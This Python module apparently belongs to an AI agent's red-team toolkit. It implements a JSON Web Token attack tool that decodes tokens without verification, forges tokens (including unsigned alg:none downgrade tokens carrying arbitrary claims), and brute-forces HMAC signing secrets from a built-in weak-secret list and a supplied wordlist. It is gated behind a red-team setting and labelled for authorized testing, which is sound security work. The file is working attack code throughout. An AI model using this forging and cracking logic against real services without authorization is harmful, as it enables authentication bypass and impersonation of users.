# SPDX-License-Identifier: AGPL-3.0-only
"""The JWT tool for authorized tests: decode a token, sign a test token, or try a list
of weak signing secrets.

Moved out of bridge.py unchanged; bridge.py re-exports every name here.
"""
from __future__ import annotations

import json
from accuretta.core.settings import get_settings


# Common weak HMAC secrets tried by the jwt_tool cracker. Small on purpose - a
# real crack uses a big wordlist via the `wordlist` arg; this catches the
# embarrassing-but-common defaults instantly.
_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt", "token", "changeme",
    "secretkey", "secret123", "s3cr3t", "test", "root", "qwerty", "letmein",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "private",
    "jwtsecret", "mysecret", "default", "hmac", "signature", "",
]


def tool_jwt_tool(args: dict) -> dict:
    """AUTHORIZED PENTEST. Decode, forge (sign), or crack a JSON Web Token - the
    bread-and-butter of modern auth attacks. Operations:
      decode : split + base64url-decode header & payload (no verification).
      sign   : build a signed token from `payload` (JSON object) with `secret`
               and `alg` (HS256|HS384|HS512|none). alg=none produces an unsigned
               token for the classic alg-confusion downgrade.
      crack  : brute a token's HMAC `secret` against a built-in weak list plus
               your optional `wordlist`. On a hit, forge with operation=sign.
    Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    import base64
    import hashlib
    import hmac as _hmac

    op = (args.get("operation") or args.get("op") or "decode").lower().strip()
    algs = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

    def b64url_enc(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

    def b64url_dec(s: str) -> bytes:
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

    try:
        if op == "decode":
            token = (args.get("token") or args.get("text") or "").strip()
            parts = token.split(".")
            if len(parts) < 2:
                return {"error": "not a JWT — expected header.payload.signature"}
            return {"operation": "decode",
                    "header": json.loads(b64url_dec(parts[0])),
                    "payload": json.loads(b64url_dec(parts[1])),
                    "signature": parts[2] if len(parts) > 2 else "",
                    "note": "signature NOT verified — inspect/forge only"}

        if op in ("sign", "encode", "forge"):
            payload = args.get("payload")
            if isinstance(payload, str):
                try:
                    payload = json.loads(payload)
                except Exception:
                    return {"error": "payload must be a JSON object (e.g. {\"user\":\"admin\"})"}
            if not isinstance(payload, dict):
                return {"error": "payload (a JSON object) is required to sign"}
            alg = (args.get("alg") or "HS256").upper()
            # alg:none must be encoded canonically lowercase, or servers that do
            # the classic downgrade check (alg == "none") won't accept it.
            header_alg = "none" if alg == "NONE" else alg
            header = args.get("header") or {}
            if isinstance(header, str):
                try:
                    header = json.loads(header)
                except Exception:
                    header = {}
            header.setdefault("alg", header_alg)
            header.setdefault("typ", "JWT")
            signing_input = (b64url_enc(json.dumps(header, separators=(",", ":")).encode()) + "." +
                             b64url_enc(json.dumps(payload, separators=(",", ":")).encode()))
            if alg == "NONE":
                return {"operation": "sign", "alg": "none", "token": signing_input + ".",
                        "note": "unsigned (alg:none) token — works only against servers that accept it"}
            if alg not in algs:
                return {"error": f"unsupported alg '{alg}' — use HS256, HS384, HS512, or none"}
            secret = args.get("secret")
            if secret is None:
                return {"error": "secret required to HMAC-sign (or use alg=none)"}
            sig = _hmac.new(str(secret).encode(), signing_input.encode(), algs[alg]).digest()
            return {"operation": "sign", "alg": alg, "token": signing_input + "." + b64url_enc(sig)}

        if op == "crack":
            token = (args.get("token") or args.get("text") or "").strip()
            parts = token.split(".")
            if len(parts) != 3:
                return {"error": "crack needs a full header.payload.signature token"}
            try:
                header = json.loads(b64url_dec(parts[0]))
            except Exception:
                return {"error": "could not decode token header"}
            alg = (header.get("alg") or "HS256").upper()
            if alg not in algs:
                return {"error": f"crack supports HMAC algs only (token uses '{alg}')"}
            signing_input = (parts[0] + "." + parts[1]).encode()
            want = parts[2]
            wl = list(_JWT_WEAK_SECRETS)
            extra = args.get("wordlist")
            if isinstance(extra, list):
                wl += [str(x) for x in extra]
            elif isinstance(extra, str):
                wl += extra.split()
            for cand in wl:
                sig = b64url_enc(_hmac.new(cand.encode(), signing_input, algs[alg]).digest())
                if _hmac.compare_digest(sig, want):
                    return {"operation": "crack", "found": True, "secret": cand, "alg": alg,
                            "note": "secret recovered — forge with operation=sign, secret=<this>"}
            return {"operation": "crack", "found": False, "tried": len(wl), "alg": alg,
                    "note": "no secret in the tested set — supply a larger `wordlist`"}

        return {"error": f"unknown operation '{op}' — use decode, sign, or crack"}
    except Exception as e:
        return {"error": f"jwt {op} failed: {e}"}
